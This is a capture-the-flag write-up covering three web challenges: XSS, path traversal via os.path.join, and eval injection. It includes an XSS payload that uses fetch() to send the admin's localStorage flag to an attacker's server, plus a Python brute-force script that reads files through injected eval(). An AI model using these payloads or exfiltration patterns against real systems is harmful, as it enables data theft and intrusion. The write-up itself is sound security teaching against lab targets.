## Fancy Button Generator // FBG

A simple xss challenge with the slightest of twists: instead of stealing admin cookies, you're stealing admin's localstorage values. This was possible because the admin, which was a puppetteer chrome browser, was operating in no-sandbox mode. 

Insert as your payload:
```
title: eh
link: javascript:fetch('your.server?fleg='%2B(window.localStorage.getItem("flag")));

```

And report to admin. Careful with the wait times...

NOTE: I first-blooded this challenge before certain measures were implemented. There were some issues with FBG throughout the competition that involved the organizers making amendments and introducing a pow to help with the stability of the infrastructure. I'm not aware of how the solution would have looked with the accompanying pow, unfortunately.

## Secure Uploader 

In the provided source, observe this piece of code: 

```py
@app.route('/file/<id>')
def file(id):
    conn = db()
    cur = conn.cursor()
    cur.execute("select path from files where id=?", (id,))
    res = cur.fetchone()
    if res is None:
        return "File not found", 404
    with open(os.path.join("uploads/", res[0]), "r") as f:
        return (os.path.join("uploads/", res[0]))
```

python's `os.path.join` is a unique thing: its purpose is to concat the provided parameters, appending one after the other with a `/` character in between. As an example, `os.path.join('foo','bar')` would produce `foo/bar`. However, specify an absolute filepath as a parameter, and everything before that string will be erased. So, `os.path.join('foo', '/bar')` would produce just `/bar`. We can use this knowledge to provide to the challenge a filename such as `//flag` which will resolve to retrieve the flag kept in the root directory of the docker container hosting the challenge.

## MAAS 1 // Calculator
The first part of "Microservices as a Service" was a challenge that involved improper use of the python function `eval()`. For those unaware, `eval()` takes as a parameter a string representing code. For example, `eval('print("hello")')` would return `hello` in your console. Obviously, not a very _safe_ function to use.

In the provided source, we see some very interesting code in `arithmetic/app.py`:

```python
@app.route('/arithmetic', methods=["POST"])
def arithmetic():
    if request.form.get('add'):
        r = requests.get(f'http://arithmetic:3000/add?n1={request.form.get("n1")}&n2={request.form.get("n2")}')
    elif request.form.get('sub'):
        r = requests.get(f'http://arithmetic:3000/sub?n1={request.form.get("n1")}&n2={request.form.get("n2")}')
    elif request.form.get('div'):
        r = requests.get(f'http://arithmetic:3000/div?n1={request.form.get("n1")}&n2={request.form.get("n2")}')
    elif request.form.get('mul'):
        r = requests.get(f'http://arithmetic:3000/mul?n1={request.form.get("n1")}&n2={request.form.get("n2")}')
    result = r.json()
    print(result)
    res = result.get('result')
    if not res:
        return str(result.get('error'))
    try:
        res_type = type(eval(res))
        if res_type is int or res_type is float:
            return str(res)
        else:
            return "Result is not a number"
    except NameError:
        return "Result is invalid"
```

This would run when you perform any arithmetic action using the calculator in the website. When using the calculator, if you try to do an addition formula like "1+1", the returned result isn't 2, but "11". Why is that?

The program passes your code into `eval()` (in the `try` statement), but the result of that `eval()` isn't returned anywhere. If the eval'd result was an integer, then the _string_ that was passed as a parameter to `eval()` would be returned, hence why "11" is returned as the result of "1+1". However, `eval()` is called nonetheless, and we can use this to our advantage.

First and foremost, if the result of the eval was a number (int or float), then the string is returned. Else, "Result is not a number" or "Result is invalid" is returned. We could use this as a boolean condition with the following string: 

```
eval("1 if (open('../flag.txt','r').read(-1).startswith('rarctf{')) else 'false'")
``` 

We can instead put this as our "arithmetic" equation. Since the POST request made to the endpoint requires 2 params to be operated on, "n1" and "n2", split this statement into 2 arbitrary halves and put 1 half into the "n1" param, and the other into the "n2" param.

What this does is it calls `eval()` once more, but in this 2nd call we have more freedom to stipulate what can be evaluated. The param to the inner `eval()` is just an if statement that returns the integer `1` if `(open('../flag.txt','r').read(-1).startswith('rarctf{'))` returns the boolean value true, or returns the string `'false'` if the statement returns the boolean value false. 

Therefore, if the contents of `flag.txt` start with the prefix "rarctf{", then the `eval()` functions will return 1, and the maas program would return the whole string as a result. If it doesn't start with that prefix, then the `eval()` functions would return the string 'false' and the if statement that checks the `res_type` would not return our string. From here, we can just continue to add characters to the prefix to brute-force the value of the flag that way: if we get back our string, then the character we guessed is in the flag. If we get back either "Result is not a number" or "Result is invalid" (or just if the response text has the keyword "Result"), then the character we guessed is not in the flag.

```py
import requests

url = "https://maas.rars.win/calculator"

alphabet = 'abcdefghijklmnopqrstuvwxyz1234567890_-{}'

prefix = 'rarctf{'

#I just chose 40 arbitrarily. If the flag was longer, I would have increased the range.
for index in range(0, 40):
    for c in alphabet:
        # It uses the python builtin function open to retrieve the contents of /flag.txt, then reads it
        # if the contents of said flag.txt contain the prefix (and we add the current character after the prefix), it returns true
        req = "eval(\"1 if (open('../flag.txt','r').read(-1).startswith('" + prefix + c + "')) else 'false'\""
        # I split the string between the n1 and n2 params arbitrarily. It doesnt matter how you split them.
        data = {"mode": "arithmetic", "n1": req, "add": "+", "n2": ")"}
        resp = requests.post(url, data)
        # If we dont find the word "Result" in the response to our request above, then that means the character we guessed is in the flag!
        if (resp.text.find("Result") == -1) and (resp.status_code != 500):
            # Add the correctly guessed character to the string amd move on to the next char
            prefix += c
            print(prefix)
            continue
```
